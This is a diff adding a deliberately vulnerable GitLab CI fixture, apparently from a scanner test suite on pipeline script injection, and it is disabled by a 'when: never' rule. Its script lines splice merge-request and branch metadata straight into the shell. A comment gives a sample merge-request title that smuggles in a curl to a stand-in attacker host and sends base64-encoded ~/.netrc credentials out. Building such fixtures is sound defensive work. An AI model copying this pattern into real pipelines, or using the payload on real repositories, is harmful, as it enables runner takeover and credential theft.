@@ -1,0 +1,42 @@
+# scenarios/39-gitlab-ci-script-injection
+# CICD-SEC-4 (Poisoned Pipeline Execution) — GitLab CI
+#
+# Pattern: an attacker-controlled predefined variable ($CI_COMMIT_TITLE,
+# the merge-request title/description, the source-branch name) is
+# interpolated straight into a `script:` line and evaluated by the runner's
+# shell. Anyone who can open a merge request controls shell *syntax*, not
+# just shell input — i.e. arbitrary command execution on the runner with
+# the job's full environment. This is the GitLab analogue of the GitHub
+# Actions `github.event.*` script-injection scenarios (02 / 30–33).
+#
+# SAFETY
+# ------
+# This file is a STATIC FIXTURE for scanners, never a live pipeline:
+#   * It is NESTED under scenarios/. GitLab only auto-runs the
+#     `.gitlab-ci.yml` at the REPOSITORY ROOT, never one in a subdirectory,
+#     so this file is inert even on a clone mirrored to GitLab.
+#   * Defense in depth: `workflow: rules: - when: never` drops every
+#     pipeline this file could produce before any job is created — the
+#     GitLab equivalent of the `if: false` gate on the GHA scenarios.
+# Do not copy this pattern. See README.md for the exploit walkthrough,
+# expected scanner coverage, and the fix.
+
+workflow:
+  rules:
+    - when: never        # safety gate — never materialise a pipeline
+
+stages: [build]
+
+greet:
+  stage: build
+  # Image pinned by digest on purpose: the ONLY intended bug in this
+  # scenario is the script injection below, not a mutable-tag finding.
+  image: alpine@sha256:beefdbd8a1da6d2915566fde36db9db0b524eb737fc57cd1367effd16dc0d06d
+  script:
+    # DANGER — attacker-controlled MR/commit metadata spliced into the shell.
+    # A merge request titled  x"; curl https://attacker.tld/$(cat ~/.netrc|base64) #
+    # turns the line below into that curl, running with the job's secrets.
+    - echo "Building $CI_COMMIT_TITLE"
+    - echo "MR opened from branch $CI_MERGE_REQUEST_SOURCE_BRANCH_NAME"
+    # DANGER — branch name interpolated into a git command
+    - git log --oneline "origin/$CI_COMMIT_REF_NAME" | head
